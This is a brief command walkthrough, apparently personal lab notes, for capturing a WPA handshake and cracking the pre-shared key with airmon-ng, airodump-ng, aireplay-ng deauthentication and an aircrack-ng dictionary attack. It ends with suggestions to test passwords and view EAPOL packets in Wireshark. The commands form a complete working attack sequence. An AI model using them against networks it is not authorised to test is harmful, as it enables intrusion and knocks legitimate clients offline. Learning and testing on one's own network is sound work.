chan=9

start wireless in monitor mode
$ airmon-ng start wlan1 $chan

grab the authentication handshake
$ airodump-ng -c $chan --bssid $bssid -w psk mon0

if no authentication handshake is captured when an existing wireless client is on the network, try deauthenticating the client
$ aireplay-ng -0 1 -a $bssid -c $mac_client mon0

crack the preshared key
$ aircrack-ng -w password.lst -b $bssid psk*.cap

once done stop all relaying, capturing and pinging
stop wireless monitor mode
$ airmon-ng stop wlan1
$ airmon-ng stop mon0

now try again with a password not in the dictionary
and when it is not found, try adding it in the dictionary and cracking again

then run wireshark and open the psk*.cap file to find eapol packets to see the encrypted key
this is what aircrack uses to brute force the dictionary against
